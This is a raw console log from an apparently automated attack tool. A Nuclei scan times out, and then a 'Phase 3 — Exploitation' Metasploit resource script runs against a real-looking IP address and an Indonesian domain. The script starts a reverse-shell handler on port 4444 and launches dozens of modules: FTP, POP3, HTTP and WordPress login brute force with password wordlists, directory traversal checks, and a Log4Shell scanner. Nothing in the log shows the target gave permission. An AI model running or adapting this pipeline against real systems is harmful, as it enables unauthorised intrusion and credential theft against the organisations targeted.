+text/html\r\nContent-Length: 163\r\nConnection: close\r\n\r\n<html>\r\n<head><title>400 Bad Request</title></head>\r\n<body>\r\n<center><h1>400 Bad 
+Request</h1></center>\r\n<hr><center>openresty/1.27.1.1</center>\r\n</body>\r\n</html>\r\n"; err=<nil>
+[      NUCLEI] 2026/02/21 22:33:00 Unsolicited response received on idle HTTP channel starting with "HTTP/1.1 400 Bad Request\r\nServer: openresty/1.27.1.1\r\nDate: Sun, 22 Feb 2026 03:33:00 GMT\r\nContent-Type: 
+text/html\r\nContent-Length: 163\r\nConnection: close\r\n\r\n<html>\r\n<head><title>400 Bad Request</title></head>\r\n<body>\r\n<center><h1>400 Bad 
+Request</h1></center>\r\n<hr><center>openresty/1.27.1.1</center>\r\n</body>\r\n</html>\r\n"; err=<nil>
+[      NUCLEI] 2026/02/21 22:33:00 Unsolicited response received on idle HTTP channel starting with "HTTP/1.1 400 Bad Request\r\nServer: openresty/1.27.1.1\r\nDate: Sun, 22 Feb 2026 03:33:00 GMT\r\nContent-Type: 
+text/html\r\nContent-Length: 163\r\nConnection: close\r\n\r\n<html>\r\n<head><title>400 Bad Request</title></head>\r\n<body>\r\n<center><h1>400 Bad 
+Request</h1></center>\r\n<hr><center>openresty/1.27.1.1</center>\r\n</body>\r\n</html>\r\n"; err=<nil>
+[      NUCLEI] 2026/02/21 22:33:00 Unsolicited response received on idle HTTP channel starting with "HTTP/1.1 400 Bad Request\r\nServer: openresty/1.27.1.1\r\nDate: Sun, 22 Feb 2026 03:33:00 GMT\r\nContent-Type: 
+text/html\r\nContent-Length: 163\r\nConnection: close\r\n\r\n<html>\r\n<head><title>400 Bad Request</title></head>\r\n<body>\r\n<center><h1>400 Bad 
+Request</h1></center>\r\n<hr><center>openresty/1.27.1.1</center>\r\n</body>\r\n</html>\r\n"; err=<nil>
+[      NUCLEI] 2026/02/21 22:33:00 Unsolicited response received on idle HTTP channel starting with "HTTP/1.1 400 Bad Request\r\nServer: openresty/1.27.1.1\r\nDate: Sun, 22 Feb 2026 03:33:00 GMT\r\nContent-Type: 
+text/html\r\nContent-Length: 163\r\nConnection: close\r\n\r\n<html>\r\n<head><title>400 Bad Request</title></head>\r\n<body>\r\n<center><h1>400 Bad 
+Request</h1></center>\r\n<hr><center>openresty/1.27.1.1</center>\r\n</body>\r\n</html>\r\n"; err=<nil>
+[      NUCLEI] {"duration":"0:00:30","errors":"1459","hosts":"7","matched":"0","percent":"2","requests":"2378","rps":"78","startedAt":"2026-02-21T22:32:56.781135708-05:00","templates":"6309","total":"101220"}
+[      NUCLEI] {"duration":"0:01:00","errors":"3362","hosts":"7","matched":"0","percent":"4","requests":"4535","rps":"75","startedAt":"2026-02-21T22:32:56.781135708-05:00","templates":"6309","total":"101220"}
+[      NUCLEI] {"duration":"0:01:30","errors":"5267","hosts":"7","matched":"0","percent":"6","requests":"6868","rps":"76","startedAt":"2026-02-21T22:32:56.781135708-05:00","templates":"6309","total":"101220"}
+[      NUCLEI] {"duration":"0:02:00","errors":"7004","hosts":"7","matched":"0","percent":"9","requests":"9399","rps":"78","startedAt":"2026-02-21T22:32:56.781135708-05:00","templates":"6309","total":"101220"}
+[      NUCLEI] {"duration":"0:02:30","errors":"9004","hosts":"7","matched":"0","percent":"12","requests":"12221","rps":"81","startedAt":"2026-02-21T22:32:56.781135708-05:00","templates":"6309","total":"101220"}
+[      NUCLEI] {"duration":"0:03:00","errors":"10771","hosts":"7","matched":"0","percent":"14","requests":"14544","rps":"80","startedAt":"2026-02-21T22:32:56.781135708-05:00","templates":"6309","total":"101220"}
+[      NUCLEI] {"duration":"0:03:30","errors":"13119","hosts":"7","matched":"0","percent":"17","requests":"18074","rps":"85","startedAt":"2026-02-21T22:32:56.781135708-05:00","templates":"6309","total":"101220"}
+[      NUCLEI] {"duration":"0:04:00","errors":"15690","hosts":"7","matched":"0","percent":"19","requests":"19753","rps":"82","startedAt":"2026-02-21T22:32:56.781135708-05:00","templates":"6309","total":"101220"}
+[      NUCLEI] {"duration":"0:04:30","errors":"18389","hosts":"7","matched":"0","percent":"21","requests":"21655","rps":"80","startedAt":"2026-02-21T22:32:56.781135708-05:00","templates":"6309","total":"101220"}
+[      NUCLEI] {"duration":"0:05:00","errors":"21026","hosts":"7","matched":"0","percent":"23","requests":"24038","rps":"80","startedAt":"2026-02-21T22:32:56.781135708-05:00","templates":"6309","total":"101220"}
+[      NUCLEI] {"duration":"0:05:30","errors":"23688","hosts":"7","matched":"0","percent":"25","requests":"25684","rps":"77","startedAt":"2026-02-21T22:32:56.781135708-05:00","templates":"6309","total":"101220"}
+[      NUCLEI] {"duration":"0:06:00","errors":"26370","hosts":"7","matched":"0","percent":"27","requests":"27458","rps":"76","startedAt":"2026-02-21T22:32:56.781135708-05:00","templates":"6309","total":"101220"}
+[      NUCLEI] {"duration":"0:06:30","errors":"27123","hosts":"7","matched":"0","percent":"27","requests":"28180","rps":"72","startedAt":"2026-02-21T22:32:56.781135708-05:00","templates":"6309","total":"101220"}
+[      NUCLEI] {"duration":"0:07:00","errors":"27494","hosts":"7","matched":"0","percent":"28","requests":"28711","rps":"68","startedAt":"2026-02-21T22:32:56.781135708-05:00","templates":"6309","total":"101220"}
+[      NUCLEI] {"duration":"0:07:30","errors":"27888","hosts":"7","matched":"0","percent":"28","requests":"29040","rps":"64","startedAt":"2026-02-21T22:32:56.781135708-05:00","templates":"6309","total":"101220"}
+[      NUCLEI] {"duration":"0:08:00","errors":"28254","hosts":"7","matched":"0","percent":"29","requests":"29424","rps":"61","startedAt":"2026-02-21T22:32:56.781135708-05:00","templates":"6309","total":"101220"}
+[      NUCLEI] {"duration":"0:08:30","errors":"28670","hosts":"7","matched":"0","percent":"29","requests":"29806","rps":"58","startedAt":"2026-02-21T22:32:56.781135708-05:00","templates":"6309","total":"101220"}
+[      NUCLEI] {"duration":"0:09:00","errors":"29073","hosts":"7","matched":"0","percent":"29","requests":"30337","rps":"56","startedAt":"2026-02-21T22:32:56.781135708-05:00","templates":"6309","total":"101220"}
+[      NUCLEI] {"duration":"0:09:30","errors":"29530","hosts":"7","matched":"0","percent":"30","requests":"31010","rps":"54","startedAt":"2026-02-21T22:32:56.781135708-05:00","templates":"6309","total":"101220"}
+[      NUCLEI] {"duration":"0:10:00","errors":"29953","hosts":"7","matched":"0","percent":"31","requests":"31392","rps":"52","startedAt":"2026-02-21T22:32:56.781135708-05:00","templates":"6309","total":"101220"}
+[      NUCLEI] {"duration":"0:10:30","errors":"30321","hosts":"7","matched":"0","percent":"31","requests":"31739","rps":"50","startedAt":"2026-02-21T22:32:56.781135708-05:00","templates":"6309","total":"101220"}
+[      NUCLEI] {"duration":"0:11:00","errors":"30717","hosts":"7","matched":"0","percent":"31","requests":"32115","rps":"48","startedAt":"2026-02-21T22:32:56.781135708-05:00","templates":"6309","total":"101220"}
+[      NUCLEI] {"duration":"0:11:30","errors":"31100","hosts":"7","matched":"0","percent":"32","requests":"32562","rps":"47","startedAt":"2026-02-21T22:32:56.781135708-05:00","templates":"6309","total":"101220"}
+[      NUCLEI] {"duration":"0:12:00","errors":"31510","hosts":"7","matched":"0","percent":"32","requests":"33017","rps":"45","startedAt":"2026-02-21T22:32:56.781135708-05:00","templates":"6309","total":"101220"}
+[      NUCLEI] {"duration":"0:12:30","errors":"31938","hosts":"7","matched":"0","percent":"33","requests":"33563","rps":"44","startedAt":"2026-02-21T22:32:56.781135708-05:00","templates":"6309","total":"101220"}
+[      NUCLEI] {"duration":"0:13:00","errors":"32351","hosts":"7","matched":"0","percent":"33","requests":"33983","rps":"43","startedAt":"2026-02-21T22:32:56.781135708-05:00","templates":"6309","total":"101220"}
+[      NUCLEI] {"duration":"0:13:30","errors":"32723","hosts":"7","matched":"0","percent":"34","requests":"34431","rps":"42","startedAt":"2026-02-21T22:32:56.781135708-05:00","templates":"6309","total":"101220"}
+[      NUCLEI] {"duration":"0:14:00","errors":"33134","hosts":"7","matched":"0","percent":"34","requests":"34927","rps":"41","startedAt":"2026-02-21T22:32:56.781135708-05:00","templates":"6309","total":"101220"}
+[      NUCLEI] [red][TIMEOUT after 900s][/red]
+
+  [FEED] amass/nmap → 1 hosts discovered
+           · v5.0.0
+  [FEED] httpx      → 2 live URLs
+           · http://109.106.253.10
+           · https://109.106.253.10
+
+─────────────────────────────────────────────────────────────────────────────────────────────────── Phase 3 — Exploitation (metasploit) ───────────────────────────────────────────────────────────────────────────────────────────────────
+[  METASPLOIT] → bash -c fuser -k 4444/tcp 2>/dev/null; sleep 1; /usr/bin/msfconsole -q -r '/tmp/crushgear_msf_cocs8sg2.rc'
+[  METASPLOIT] [*] Processing /tmp/crushgear_msf_cocs8sg2.rc for ERB directives.
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> setg LHOST 202.180.25.41
+[  METASPLOIT] LHOST => 202.180.25.41
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> setg LPORT 4444
+[  METASPLOIT] LPORT => 4444
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> use exploit/multi/handler
+[  METASPLOIT] [*] Using configured payload generic/shell_reverse_tcp
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set PAYLOAD generic/shell_reverse_tcp
+[  METASPLOIT] PAYLOAD => generic/shell_reverse_tcp
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set LHOST 202.180.25.41
+[  METASPLOIT] LHOST => 202.180.25.41
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set LPORT 4444
+[  METASPLOIT] LPORT => 4444
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set ExitOnSession false
+[  METASPLOIT] ExitOnSession => false
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> run -j -z
+[  METASPLOIT] [*] Exploit running as background job 0.
+[  METASPLOIT] [*] Exploit completed, but no session was created.
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> use auxiliary/scanner/portscan/tcp
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set RHOSTS stikes.gunungsari.id
+[  METASPLOIT] RHOSTS => stikes.gunungsari.id
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set PORTS 21,22,23,25,53,80,88,110,135,139,143,389,443,445,464,593,636,1433,3268,3269,3389,5985,5986,8080,8443,27017
+[  METASPLOIT] PORTS => 21,22,23,25,53,80,88,110,135,139,143,389,443,445,464,593,636,1433,3268,3269,3389,5985,5986,8080,8443,27017
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> run -j
+[  METASPLOIT] [-] Handler failed to bind to 202.180.25.41:4444:-  -
+[  METASPLOIT] [*] Started reverse TCP handler on 0.0.0.0:4444
+[  METASPLOIT] [*] Auxiliary module running as background job 1.
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> use auxiliary/scanner/ftp/ftp_version
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set RHOSTS 109.106.253.10
+[  METASPLOIT] RHOSTS => 109.106.253.10
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> run -j
+[  METASPLOIT] [*] Auxiliary module running as background job 2.
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> use auxiliary/scanner/ftp/anonymous
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set RHOSTS 109.106.253.10
+[  METASPLOIT] RHOSTS => 109.106.253.10
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> run -j
+[  METASPLOIT] [*] Auxiliary module running as background job 3.
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> use auxiliary/scanner/ftp/ftp_login
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set RHOSTS 109.106.253.10
+[  METASPLOIT] RHOSTS => 109.106.253.10
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set BLANK_PASSWORDS true
+[  METASPLOIT] BLANK_PASSWORDS => true
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set USER_AS_PASS true
+[  METASPLOIT] USER_AS_PASS => true
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set STOP_ON_SUCCESS false
+[  METASPLOIT] STOP_ON_SUCCESS => false
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set USER_FILE /usr/share/metasploit-framework/data/wordlists/unix_users.txt
+[  METASPLOIT] USER_FILE => /usr/share/metasploit-framework/data/wordlists/unix_users.txt
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+[  METASPLOIT] PASS_FILE => /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> run -j
+[  METASPLOIT] [*] Auxiliary module running as background job 4.
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> use auxiliary/scanner/smtp/smtp_version
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set RHOSTS 109.106.253.10
+[  METASPLOIT] RHOSTS => 109.106.253.10
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> run -j
+[  METASPLOIT] [*] Auxiliary module running as background job 5.
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> use auxiliary/scanner/smtp/smtp_enum
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set RHOSTS 109.106.253.10
+[  METASPLOIT] RHOSTS => 109.106.253.10
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> run -j
+[  METASPLOIT] [*] Auxiliary module running as background job 6.
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> use auxiliary/scanner/smtp/smtp_relay
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set RHOSTS 109.106.253.10
+[  METASPLOIT] RHOSTS => 109.106.253.10
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> run -j
+[  METASPLOIT] [*] Auxiliary module running as background job 7.
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> use auxiliary/scanner/smtp/smtp_ntlm_domain
+[  METASPLOIT] [*] 109.106.253.10:21     - 109.106.253.10:21 - Starting FTP login sweep
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set RHOSTS 109.106.253.10
+[  METASPLOIT] RHOSTS => 109.106.253.10
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> run -j
+[  METASPLOIT] [*] Auxiliary module running as background job 8.
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> use auxiliary/scanner/http/http_version
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set RHOSTS 109.106.253.10
+[  METASPLOIT] RHOSTS => 109.106.253.10
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set RPORT 80
+[  METASPLOIT] RPORT => 80
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> run -j
+[  METASPLOIT] [*] Auxiliary module running as background job 9.
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> use auxiliary/scanner/http/ntlm_info_enumeration
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set RHOSTS 109.106.253.10
+[  METASPLOIT] RHOSTS => 109.106.253.10
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set RPORT 80
+[  METASPLOIT] RPORT => 80
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> run -j
+[  METASPLOIT] [*] Auxiliary module running as background job 10.
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> use auxiliary/scanner/http/title
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set RHOSTS 109.106.253.10
+[  METASPLOIT] RHOSTS => 109.106.253.10
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set RPORT 80
+[  METASPLOIT] RPORT => 80
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> run -j
+[  METASPLOIT] [*] Auxiliary module running as background job 11.
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> use auxiliary/scanner/http/options
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set RHOSTS 109.106.253.10
+[  METASPLOIT] RHOSTS => 109.106.253.10
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set RPORT 80
+[  METASPLOIT] RPORT => 80
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> run -j
+[  METASPLOIT] [*] Auxiliary module running as background job 12.
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> use auxiliary/scanner/http/webdav_scanner
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set RHOSTS 109.106.253.10
+[  METASPLOIT] RHOSTS => 109.106.253.10
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set RPORT 80
+[  METASPLOIT] RPORT => 80
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> run -j
+[  METASPLOIT] [*] Auxiliary module running as background job 13.
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> use auxiliary/scanner/http/http_put
+[  METASPLOIT] [*] Setting default action PUT - view all 2 actions with the show actions command
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set RHOSTS 109.106.253.10
+[  METASPLOIT] RHOSTS => 109.106.253.10
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set RPORT 80
+[  METASPLOIT] RPORT => 80
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> run -j
+[  METASPLOIT] [*] Auxiliary module running as background job 14.
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> use auxiliary/scanner/http/cert
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set RHOSTS 109.106.253.10
+[  METASPLOIT] RHOSTS => 109.106.253.10
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set RPORT 80
+[  METASPLOIT] RPORT => 80
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set SSL false
+[  METASPLOIT] SSL => false
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> run -j
+[  METASPLOIT] [*] Auxiliary module running as background job 15.
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> use auxiliary/scanner/http/coldfusion_version
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set RHOSTS 109.106.253.10
+[  METASPLOIT] RHOSTS => 109.106.253.10
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set RPORT 80
+[  METASPLOIT] RPORT => 80
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> run -j
+[  METASPLOIT] [*] Auxiliary module running as background job 16.
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> use auxiliary/scanner/http/glassfish_traversal
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set RHOSTS 109.106.253.10
+[  METASPLOIT] RHOSTS => 109.106.253.10
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set RPORT 80
+[  METASPLOIT] RPORT => 80
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> run -j
+[  METASPLOIT] [*] Auxiliary module running as background job 17.
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> use auxiliary/scanner/http/joomla_version
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set RHOSTS 109.106.253.10
+[  METASPLOIT] RHOSTS => 109.106.253.10
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set RPORT 80
+[  METASPLOIT] RPORT => 80
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> run -j
+[  METASPLOIT] [*] Auxiliary module running as background job 18.
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> use auxiliary/scanner/http/tomcat_mgr_login
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set RHOSTS 109.106.253.10
+[  METASPLOIT] RHOSTS => 109.106.253.10
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set RPORT 80
+[  METASPLOIT] RPORT => 80
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> run -j
+[  METASPLOIT] [*] Auxiliary module running as background job 19.
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> use auxiliary/scanner/http/wordpress_xmlrpc_login
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set RHOSTS 109.106.253.10
+[  METASPLOIT] RHOSTS => 109.106.253.10
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set RPORT 80
+[  METASPLOIT] RPORT => 80
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> run -j
+[  METASPLOIT] [*] Auxiliary module running as background job 20.
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> use auxiliary/scanner/http/rails_mass_assignment
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set RHOSTS 109.106.253.10
+[  METASPLOIT] RHOSTS => 109.106.253.10
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set RPORT 80
+[  METASPLOIT] RPORT => 80
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> run -j
+[  METASPLOIT] [*] Auxiliary module running as background job 21.
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> use auxiliary/scanner/http/http_login
+[  METASPLOIT] [*] 109.106.253.10:80    :/xmlrpc.php - Sending Hello...
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set RHOSTS 109.106.253.10
+[  METASPLOIT] RHOSTS => 109.106.253.10
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set RPORT 80
+[  METASPLOIT] RPORT => 80
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> run -j
+[  METASPLOIT] [*] Scanned 1 of 1 hosts (100% complete)
+[  METASPLOIT] [*] Auxiliary module running as background job 22.
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> use auxiliary/scanner/http/drupal_views_user_enum
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set RHOSTS 109.106.253.10
+[  METASPLOIT] RHOSTS => 109.106.253.10
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set RPORT 80
+[  METASPLOIT] RPORT => 80
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> run -j
+[  METASPLOIT] [*] Auxiliary module running as background job 23.
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> use auxiliary/scanner/http/grafana_plugin_traversal
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set RHOSTS 109.106.253.10
+[  METASPLOIT] RHOSTS => 109.106.253.10
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set RPORT 80
+[  METASPLOIT] RPORT => 80
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> run -j
+[  METASPLOIT] [*] Auxiliary module running as background job 24.
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> use auxiliary/scanner/http/log4shell_scanner
+[  METASPLOIT] /usr/share/metasploit-framework/lib/rex/proto/ldap.rb:13: warning: already initialized constant Net::LDAP::WhoamiOid
+[  METASPLOIT] /usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/net-ldap-0.20.0/lib/net/ldap.rb:344: warning: previous definition of WhoamiOid was here
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set RHOSTS 109.106.253.10
+[  METASPLOIT] RHOSTS => 109.106.253.10
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set RPORT 80
+[  METASPLOIT] RPORT => 80
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> run -j
+[  METASPLOIT] [*] Auxiliary module running as background job 25.
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> use auxiliary/scanner/http/jenkins_login
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set RHOSTS 109.106.253.10
+[  METASPLOIT] RHOSTS => 109.106.253.10
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set RPORT 80
+[  METASPLOIT] RPORT => 80
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> run -j
+[  METASPLOIT] [*] Auxiliary module running as background job 26.
+[  METASPLOIT] [-] Auxiliary aborted due to failure: bad-config: The SRVHOST option must be set to a routable IP address.
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> use auxiliary/scanner/pop3/pop3_version
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set RHOSTS 109.106.253.10
+[  METASPLOIT] RHOSTS => 109.106.253.10
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> run -j
+[  METASPLOIT] [*] Auxiliary module running as background job 27.
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> use auxiliary/scanner/pop3/pop3_login
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set RHOSTS 109.106.253.10
+[  METASPLOIT] RHOSTS => 109.106.253.10
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set BLANK_PASSWORDS true
+[  METASPLOIT] BLANK_PASSWORDS => true
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> run -j
+[  METASPLOIT] [*] Auxiliary module running as background job 28.
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> use auxiliary/scanner/imap/imap_version
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set RHOSTS 109.106.253.10
+[  METASPLOIT] RHOSTS => 109.106.253.10
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> run -j
+[  METASPLOIT] [*] Auxiliary module running as background job 29.
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> use auxiliary/scanner/imap/imap_login
+[  METASPLOIT] [-] No results from search
+[  METASPLOIT] [-] Failed to load module: auxiliary/scanner/imap/imap_login
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set RHOSTS 109.106.253.10
+[  METASPLOIT] RHOSTS => 109.106.253.10
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set BLANK_PASSWORDS true
+[  METASPLOIT] [!] Unknown datastore option: BLANK_PASSWORDS.
+[  METASPLOIT] BLANK_PASSWORDS => true
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> run -j
+[  METASPLOIT] [*] Auxiliary module running as background job 30.
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> use auxiliary/scanner/http/http_version
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set RHOSTS 109.106.253.10
+[  METASPLOIT] RHOSTS => 109.106.253.10
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set RPORT 443
+[  METASPLOIT] RPORT => 443
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set SSL true
+[  METASPLOIT] [!] Changing the SSL option's value may require changing RPORT!
+[  METASPLOIT] SSL => true
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> run -j
+[  METASPLOIT] [*] Auxiliary module running as background job 31.
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> use auxiliary/scanner/http/ntlm_info_enumeration
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set RHOSTS 109.106.253.10
+[  METASPLOIT] RHOSTS => 109.106.253.10
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set RPORT 443
+[  METASPLOIT] RPORT => 443
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set SSL true
+[  METASPLOIT] [!] Changing the SSL option's value may require changing RPORT!
+[  METASPLOIT] SSL => true
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> run -j
+[  METASPLOIT] [*] Auxiliary module running as background job 32.
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> use auxiliary/scanner/http/title
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set RHOSTS 109.106.253.10
+[  METASPLOIT] RHOSTS => 109.106.253.10
